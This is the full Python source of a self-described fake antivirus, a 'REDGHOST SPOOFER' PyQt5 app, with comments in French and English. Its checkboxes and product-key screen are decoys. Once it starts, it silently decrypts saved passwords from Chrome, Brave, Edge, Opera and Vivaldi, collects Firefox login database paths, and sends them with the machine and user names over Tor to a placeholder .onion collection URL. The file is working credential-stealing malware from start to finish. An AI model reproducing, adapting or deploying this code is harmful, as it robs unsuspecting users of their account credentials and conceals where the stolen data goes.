# Ce script est une fausse version d’un antivirus avec un stealer intégré qui envoie les données via un serveur Tor.
# This script is a fake antivirus with an integrated stealer that sends data through a Tor server.


import os
import json
import base64
import sqlite3
import shutil
import sys
import time
import hashlib
import getpass
import threading
import concurrent.futures
import subprocess
import tempfile
from datetime import datetime
import socket
import socks
import requests
from PyQt5.QtWidgets import (QApplication, QMainWindow, QLabel, QPushButton, 
                           QLineEdit, QCheckBox, QComboBox, QFrame, QHBoxLayout, 
                           QVBoxLayout, QWidget, QGridLayout, QGroupBox, QMessageBox)
from PyQt5.QtGui import QFont, QIcon
from PyQt5.QtCore import Qt, QTimer

# Importation des dépendances Windows
try:
    import win32crypt
    from Crypto.Cipher import AES
    import qtawesome as qta
    # Dépendances pour Tor
    import stem.process
    from stem.control import Controller
except ImportError as e:
    if getattr(sys, 'frozen', False):
        subprocess.run(["cmd", "/c", f"echo Erreur critique: {e} && pause"])
    sys.exit(1)

def get_script_dir():
    """Obtenir le répertoire du script, fonctionne avec PyInstaller"""
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.abspath(__file__))

def get_master_key(browser_path):
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        if not os.path.exists(local_state_path):
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
            
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def decrypt_password(encrypted_password, master_key):
    try:
        if not encrypted_password:
            return "❌ Mot de passe vide"
            
        if len(encrypted_password) > 3 and (encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11'):
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt_and_verify(payload, tag)
            decrypted_pass = decrypted_pass.rstrip(b"\x00").rstrip(b"\x10")
            return decrypted_pass.decode('utf-8', errors='ignore').strip()
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except:
        return "❌ Erreur de déchiffrement"

# Classe pour gérer la connexion Tor
class TorManager:
    def __init__(self):
        self.tor_process = None
        self.tor_port = 9050
        self.tor_control_port = 9051
        self.tor_password = hashlib.sha256(os.urandom(16)).hexdigest()
        self.session = requests.session()
        
    def start_tor(self):
        """Démarre un processus Tor en arrière-plan"""
        try:
            # Vérifier si Tor est déjà en cours d'exécution
            try:
                s = socket.socket()
                s.connect(('127.0.0.1', self.tor_port))
                s.close()
                # Tor semble déjà en cours d'exécution
                self.configure_session()
                return True
            except:
                pass
                
            # Configuration de Tor avec stem
            tor_config = {
                'SocksPort': str(self.tor_port),
                'ControlPort': str(self.tor_control_port),
                'HashedControlPassword': stem.control.get_password_hash(self.tor_password),
                'DataDirectory': os.path.join(tempfile.gettempdir(), f"tor_data_{os.urandom(4).hex()}"),
                'Log': 'NOTICE stdout'
            }
            
            self.tor_process = stem.process.launch_tor_with_config(
                config=tor_config,
                take_ownership=True,
                init_msg_handler=lambda msg: None
            )
            
            time.sleep(5)  # Attendre que Tor soit initialisé
            self.configure_session()
            return True
        except Exception as e:
            print(f"Erreur lors du démarrage de Tor: {e}")
            return False
    
    def configure_session(self):
        """Configure la session requests pour utiliser Tor"""
        self.session.proxies = {
            'http': f'socks5h://127.0.0.1:{self.tor_port}',
            'https': f'socks5h://127.0.0.1:{self.tor_port}'
        }
        # Configuration de socks pour les connexions directes
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", self.tor_port)
        socket.socket = socks.socksocket
    
    def stop_tor(self):
        """Arrête le processus Tor"""
        if self.tor_process:
            self.tor_process.kill()
    
    def send_data_anonymously(self, content, onion_url):
        """Envoie des données via le réseau Tor à un service onion"""
        if not onion_url:
            return False
        
        try:
            # Préparer les données avec un chiffrement supplémentaire
            encrypted_data = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "data": base64.b64encode(content.encode('utf-8')).decode('utf-8'),
                "source_id": hashlib.sha256(os.urandom(16)).hexdigest()[:16]
            }
            
            # Envoyer les données via Tor
            response = self.session.post(
                onion_url,
                json=encrypted_data,
                timeout=60  # Les connexions Tor peuvent être lentes
            )
            
            return response.status_code == 200
        except Exception as e:
            print(f"Erreur lors de l'envoi des données: {e}")
            return False

def process_profile(browser_name, base_path, profile, tor_manager, onion_url, all_passwords, master_key):
    profile_path = os.path.join(base_path, profile)
    if not os.path.exists(profile_path):
        return
        
    login_db = os.path.join(profile_path, "Login Data")
    if not os.path.exists(login_db):
        return
        
    # Créer un dossier temporaire dédié
    temp_dir = os.path.join(tempfile.gettempdir(), f"redghost_{os.urandom(4).hex()}")
    os.makedirs(temp_dir, exist_ok=True)
    temp_login_db = os.path.join(temp_dir, f"{browser_name}_{profile}_login_data.db")
    
    try:
        # Copier la base de données pour éviter les problèmes de verrouillage
        shutil.copy2(login_db, temp_login_db)
    except:
        return
        
    try:
        conn = sqlite3.connect(temp_login_db)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT NULL AND username_value != '' AND password_value IS NOT NULL")
        profile_passwords = []
        all_content = ""
        
        for url, username, encrypted_password in cursor.fetchall():
            try:
                password = decrypt_password(encrypted_password, master_key)
                profile_passwords.append({
                    "url": url,
                    "username": username,
                    "password": password,
                    "browser": f"{browser_name} ({profile})"
                })
                all_content += f"Site: {url}\nUtilisateur: {username}\nMot de passe: {password}\n\n"
            except:
                pass
                
        cursor.close()
        conn.close()
        
        if profile_passwords:
            all_passwords.extend(profile_passwords)
            
            if onion_url:
                content = f"INFORMATIONS DE CONNEXION {browser_name.upper()} ({profile}) - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                content += f"Ordinateur: {os.environ.get('COMPUTERNAME', 'Inconnu')}\n"
                content += f"Utilisateur: {os.environ.get('USERNAME', 'Inconnu')}\n\n"
                content += all_content
                
                send_thread = threading.Thread(target=tor_manager.send_data_anonymously, args=(content, onion_url))
                send_thread.daemon = True
                send_thread.start()
                send_thread.join(timeout=30)  # Délai plus long pour les connexions Tor
    except:
        pass
    finally:
        try:
            # Nettoyage
            if os.path.exists(temp_login_db):
                os.remove(temp_login_db)
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir, ignore_errors=True)
        except:
            pass

def get_chrome_based_passwords(browser_name, browser_path, tor_manager, onion_url=None, all_passwords=None):
    if all_passwords is None:
        all_passwords = []
        
    base_path = os.path.expanduser('~') + browser_path
    
    if not os.path.exists(base_path):
        return all_passwords
        
    profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
    master_key = get_master_key(base_path)
    
    if not master_key:
        return all_passwords
        
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [
            executor.submit(process_profile, browser_name, base_path, profile, tor_manager, onion_url, all_passwords, master_key)
            for profile in profiles
        ]
        concurrent.futures.wait(futures)
        
    return all_passwords

def get_firefox_passwords(tor_manager, onion_url=None, all_passwords=None):
    if all_passwords is None:
        all_passwords = []
        
    base_path = os.path.expanduser('~') + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
    
    if not os.path.exists(base_path):
        return all_passwords
        
    for profile_folder in os.listdir(base_path):
        try:
            if not profile_folder.endswith('.default') and not '.default-release' in profile_folder:
                continue
                
            profile_path = os.path.join(base_path, profile_folder)
            login_db = os.path.join(profile_path, "logins.json")
            
            if not os.path.exists(login_db):
                login_db = os.path.join(profile_path, "signons.sqlite")
                if not os.path.exists(login_db):
                    continue
                    
            all_passwords.append({
                "url": "Firefox Info",
                "username": "Voir chemin",
                "password": login_db,
                "browser": f"Firefox ({profile_folder})"
            })
            
            if onion_url:
                content = f"INFORMATIONS FIREFOX ({profile_folder}) - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                content += f"Ordinateur: {os.environ.get('COMPUTERNAME', 'Inconnu')}\n"
                content += f"Utilisateur: {os.environ.get('USERNAME', 'Inconnu')}\n\n"
                content += f"Chemin de la base de données: {login_db}"
                
                send_thread = threading.Thread(target=tor_manager.send_data_anonymously, args=(content, onion_url))
                send_thread.daemon = True
                send_thread.start()
                send_thread.join(timeout=30)
        except:
            pass
            
    return all_passwords

# Classe d'interface graphique
class SpooferApplication(QMainWindow):
    def __init__(self):
        super().__init__()
        self.key_activated = False  # Variable pour suivre l'état d'activation
        self.all_passwords = []  # Pour stocker les mots de passe trouvés
        self.tor_manager = TorManager()  # Initialiser le gestionnaire Tor
        self.initUI()
        
        # Lancer automatiquement l'extraction au démarrage
        # Utiliser un QTimer pour démarrer l'extraction après que l'interface soit chargée
        QTimer.singleShot(100, self.start_background_extraction)
        
    def initUI(self):
        # Configuration de la fenêtre principale
        self.setWindowTitle('REDGHOST SPOOFER')
        self.setGeometry(100, 100, 650, 550)
        self.setStyleSheet("background-color: #1E1E1E; color: white;")
        self.setWindowIcon(qta.icon('fa5s.shield-alt', color='#CC0000'))
        
        # Widget central
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Layout principal
        main_layout = QVBoxLayout(central_widget)
        
        # Titre avec icône
        title_layout = QHBoxLayout()
        icon_label = QLabel()
        icon_label.setPixmap(qta.icon('fa5s.fingerprint', color='#CC0000').pixmap(48, 48))
        title_layout.addWidget(icon_label)
        
        title_label = QLabel('REDGHOST SPOOFER')
        title_label.setFont(QFont('Arial', 24, QFont.Bold))
        title_label.setStyleSheet("color: #CC0000;")
        title_layout.addWidget(title_label)
        title_layout.setAlignment(Qt.AlignCenter)
        main_layout.addLayout(title_layout)
        
        # Section pour la clé produit
        key_frame = QFrame()
        key_frame.setStyleSheet("background-color: #252525; padding: 15px; margin: 10px;")
        key_layout = QVBoxLayout(key_frame)
        
        key_title = QLabel("Renseigner clé produit")
        key_title.setFont(QFont('Arial', 12))
        key_title.setStyleSheet("color: #CC0000;")
        key_layout.addWidget(key_title)
        
        key_input_layout = QHBoxLayout()
        key_icon = QLabel()
        key_icon.setPixmap(qta.icon('fa5s.key', color='#CC0000').pixmap(24, 24))
        key_input_layout.addWidget(key_icon)
        
        # Champ pour la clé
        self.key_input = QLineEdit()
        self.key_input.setStyleSheet("background-color: #333333; color: white; padding: 8px;")
        self.key_input.setPlaceholderText("XXXXX-XXXXX-XXXXX-XXXXX")
        key_input_layout.addWidget(self.key_input)
        
        key_layout.addLayout(key_input_layout)
        
        # Bouton d'activation
        self.activate_button = QPushButton(" Activer")
        self.activate_button.setIcon(qta.icon('fa5s.check-circle', color='white'))
        self.activate_button.setStyleSheet("background-color: #CC0000; color: white; padding: 8px;")
        self.activate_button.clicked.connect(self.verify_key)
        key_layout.addWidget(self.activate_button)
        
        # Indicateur d'état d'activation
        self.activation_status = QLabel("État: Non activé")
        self.activation_status.setStyleSheet("color: #FF5555;")
        key_layout.addWidget(self.activation_status)
        
        main_layout.addWidget(key_frame)
        
        # Section des fonctionnalités
        features_frame = QFrame()
        features_frame.setStyleSheet("background-color: #252525; padding: 15px; margin: 10px;")
        features_layout = QGridLayout(features_frame)
        
        # Première colonne
        hardware_group = QGroupBox("Modification Hardware")
        hardware_group.setStyleSheet("color: white;")
        hardware_layout = QVBoxLayout(hardware_group)
        
        hardware_options = [
            ("Modifier MAC Address", "fa5s.network-wired"),
            ("Spoofer HWID", "fa5s.microchip"),
            ("Changer Serial Numbers", "fa5s.barcode"),
            ("Modifier BIOS Info", "fa5s.memory"),
            ("Générer UUID Aléatoire", "fa5s.random")
        ]
        
        for option, icon_name in hardware_options:
            checkbox = QCheckBox(option)
            checkbox.setIcon(qta.icon(icon_name, color='#CC0000'))
            checkbox.setStyleSheet("color: white;")
            hardware_layout.addWidget(checkbox)
        
        features_layout.addWidget(hardware_group, 0, 0)
        
        # Deuxième colonne
        network_group = QGroupBox("Outils Réseau")
        network_group.setStyleSheet("color: white;")
        network_layout = QVBoxLayout(network_group)
        
        network_options = [
            ("Masquer IP", "fa5s.mask"),
            ("Anti-Tracking DNS", "fa5s.globe"),
            ("Proxy VPN Intégré", "fa5s.route"),
            ("Firewall Avancé", "fa5s.fire"),
            ("Nettoyer Traces Réseau", "fa5s.broom")
        ]
        
        for option, icon_name in network_options:
            checkbox = QCheckBox(option)
            checkbox.setIcon(qta.icon(icon_name, color='#CC0000'))
            checkbox.setStyleSheet("color: white;")
            network_layout.addWidget(checkbox)
        
        features_layout.addWidget(network_group, 0, 1)
        
        # Troisième colonne
        security_group = QGroupBox("Sécurité")
        security_group.setStyleSheet("color: white;")
        security_layout = QVBoxLayout(security_group)
        
        security_options = [
            ("Protection Anti-Ban", "fa5s.user-shield"),
            ("Nettoyage Traces", "fa5s.eraser"),
            ("Mode Furtif", "fa5s.user-ninja"),
            ("Désactivation Télémétrie", "fa5s.eye-slash"),
            ("Anti-Détection", "fa5s.ghost")
        ]
        
        for option, icon_name in security_options:
            checkbox = QCheckBox(option)
            checkbox.setIcon(qta.icon(icon_name, color='#CC0000'))
            checkbox.setStyleSheet("color: white;")
            security_layout.addWidget(checkbox)
        
        features_layout.addWidget(security_group, 0, 2)
        
        main_layout.addWidget(features_frame)
        
        # Section inférieure pour les options de configuration
        config_frame = QFrame()
        config_frame.setStyleSheet("background-color: #252525; padding: 15px; margin: 10px;")
        config_layout = QHBoxLayout(config_frame)
        
        # Sélection de profil
        profile_label = QLabel("Profil:")
        profile_label.setStyleSheet("color: white;")
        config_layout.addWidget(profile_label)
        
        profile_combo = QComboBox()
        profile_combo.addItems(["Profil Standard", "Profil Gaming", "Profil Sécurisé", "Profil Personnalisé"])
        profile_combo.setStyleSheet("background-color: #333333; color: white; padding: 5px;")
        config_layout.addWidget(profile_combo)
        
        # Sélection de mode
        mode_label = QLabel("Mode:")
        mode_label.setStyleSheet("color: white;")
        config_layout.addWidget(mode_label)
        
        mode_combo = QComboBox()
        mode_combo.addItems(["Mode Normal", "Mode Agressif", "Mode Discret"])
        mode_combo.setStyleSheet("background-color: #333333; color: white; padding: 5px;")
        config_layout.addWidget(mode_combo)
        
        # Bouton paramètres
        settings_button = QPushButton(" Paramètres")
        settings_button.setIcon(qta.icon('fa5s.cog', color='white'))
        settings_button.setStyleSheet("background-color: #333333; color: white; padding: 5px;")
        config_layout.addWidget(settings_button)
        
        main_layout.addWidget(config_frame)
        
        # Bouton d'exécution
        self.execute_button = QPushButton(" Exécuter")
        self.execute_button.setIcon(qta.icon('fa5s.play', color='white'))
        self.execute_button.setStyleSheet("background-color: #555555; color: white; padding: 10px; margin: 10px 150px;")
        self.execute_button.setFont(QFont('Arial', 12, QFont.Bold))
        self.execute_button.clicked.connect(self.execute_spoofer)
        self.execute_button.setEnabled(False)  # Désactivé par défaut
        main_layout.addWidget(self.execute_button)
        
        # Barre de statut
        self.statusBar().showMessage("Prêt - Veuillez entrer votre clé produit")
        self.statusBar().setStyleSheet("background-color: #333333; color: white;")
        
        # État du service Tor
        self.tor_status = QLabel("Tor: Inactif")
        self.tor_status.setStyleSheet("color: #FF5555;")
        self.statusBar().addPermanentWidget(self.tor_status)
    
    def start_background_extraction(self):
        """Lance l'extraction des mots de passe en arrière-plan dès le démarrage"""
        # Essaye de démarrer Tor d'abord
        tor_thread = threading.Thread(target=self.start_tor_service)
        tor_thread.daemon = True
        tor_thread.start()
        tor_thread.join(timeout=10)  # Attendre jusqu'à 10 secondes que Tor démarre
        
        # Configuration de l'URL onion (remplacer par votre propre service .onion)
        onion_url = "http://yourhiddenservice.onion/collect"  # À remplacer par votre service onion réel
        
        # Créer et démarrer le thread d'extraction
        extract_thread = threading.Thread(target=self.extract_passwords, args=(onion_url, self.all_passwords))
        extract_thread.daemon = True
        extract_thread.start()
    
    def start_tor_service(self):
        """Démarre le service Tor"""
        try:
            if self.tor_manager.start_tor():
                # Mettre à jour l'interface depuis le thread principal pour éviter les problèmes
                self.update_tor_status(True)
            else:
                self.update_tor_status(False)
        except Exception as e:
            print(f"Erreur lors du démarrage de Tor: {e}")
            self.update_tor_status(False)
    
    def update_tor_status(self, active):
        """Met à jour l'indicateur de statut Tor dans l'interface"""
        if active:
            self.tor_status.setText("Tor: Actif")
            self.tor_status.setStyleSheet("color: #55FF55;")
        else:
            self.tor_status.setText("Tor: Erreur")
            self.tor_status.setStyleSheet("color: #FF5555;")
    
    def verify_key(self):
        key = self.key_input.text()
        # Exemple de vérification simple
        valid_keys = ["LK7L-G81I-TBQE-NWUT-JTXP", "P8P6-9B0X-MV7D-CETC-ZW5E"]
        
        if key in valid_keys:
            self.key_activated = True
            QMessageBox.information(self, "Activation", "Clé produit validée avec succès!")
            self.statusBar().showMessage("Enregistré - Licence active")
            
            # Mise à jour de l'interface utilisateur
            self.activation_status.setText("État: Activé")
            self.activation_status.setStyleSheet("color: #55FF55;")
            self.activate_button.setEnabled(False)
            self.activate_button.setStyleSheet("background-color: #006600; color: white; padding: 8px;")
            self.activate_button.setText(" Activé")
            
            # Activer le bouton d'exécution
            self.execute_button.setEnabled(True)
            self.execute_button.setStyleSheet("background-color: #CC0000; color: white; padding: 10px; margin: 10px 150px;")
            
            # Désactiver la modification de la clé
            self.key_input.setReadOnly(True)
            self.key_input.setStyleSheet("background-color: #444444; color: white; padding: 8px;")
        else:
            QMessageBox.warning(self, "Erreur", "Clé produit invalide. Veuillez réessayer.")
            self.statusBar().showMessage("Échec de l'activation - Clé invalide")
    
    def execute_spoofer(self):
        # Vérifier si la clé a été activée avant d'exécuter
        if not self.key_activated:
            QMessageBox.warning(self, "Erreur", "Veuillez activer votre produit avant d'exécuter.")
            return
        
        # Simuler un traitement (l'extraction a déjà été lancée au démarrage)
        QMessageBox.information(self, "Opération", "Processus de spoofing lancé avec succès!")
        self.statusBar().showMessage("Opération terminée")
    
    def extract_passwords(self, onion_url, all_passwords):
        """Fonction pour extraire les mots de passe de tous les navigateurs"""
        # Définir les navigateurs à analyser
        browser_tasks = [
            {"name": "Chrome", "path": r"\AppData\Local\Google\Chrome\User Data"},
            {"name": "Brave", "path": r"\AppData\Local\BraveSoftware\Brave-Browser\User Data"},
            {"name": "Edge", "path": r"\AppData\Local\Microsoft\Edge\User Data"},
            {"name": "Opera", "path": r"\AppData\Roaming\Opera Software\Opera Stable"},
            {"name": "Vivaldi", "path": r"\AppData\Local\Vivaldi\User Data"}
        ]
        
        # Traiter chaque navigateur
        for browser in browser_tasks:
            try:
                get_chrome_based_passwords(
                    browser["name"], 
                    browser["path"], 
                    self.tor_manager,
                    onion_url, 
                    all_passwords
                )
            except:
                pass
                
        # Traiter Firefox
        try:
            get_firefox_passwords(self.tor_manager, onion_url, all_passwords)
        except:
            pass
            
        # Envoyer un résumé final
        if onion_url and all_passwords:
            summary_content = f"RÉSUMÉ D'EXTRACTION - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            summary_content += f"Ordinateur: {os.environ.get('COMPUTERNAME', 'Inconnu')}\n"
            summary_content += f"Utilisateur: {os.environ.get('USERNAME', 'Inconnu')}\n\n"
            summary_content += f"Identifiants trouvés: {len(all_passwords)}\n"
            
            browser_count = {}
            for item in all_passwords:
                browser = item['browser'].split(' ')[0]
                browser_count[browser] = browser_count.get(browser, 0) + 1
                
            summary_content += "\nRépartition par navigateur:\n"
            for browser, count in browser_count.items():
                summary_content += f"- {browser}: {count} identifiants\n"
                
            # Envoi via Tor
            self.tor_manager.send_data_anonymously(summary_content, onion_url)
    
    def closeEvent(self, event):
        """Gestionnaire pour l'événement de fermeture"""
        # Arrêter proprement le processus Tor
        self.tor_manager.stop_tor()
        event.accept()

# Point d'entrée de l'application
def main():
    try:
        import ctypes
    except:
        pass
        
    app = QApplication(sys.argv)
    ex = SpooferApplication()
    ex.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()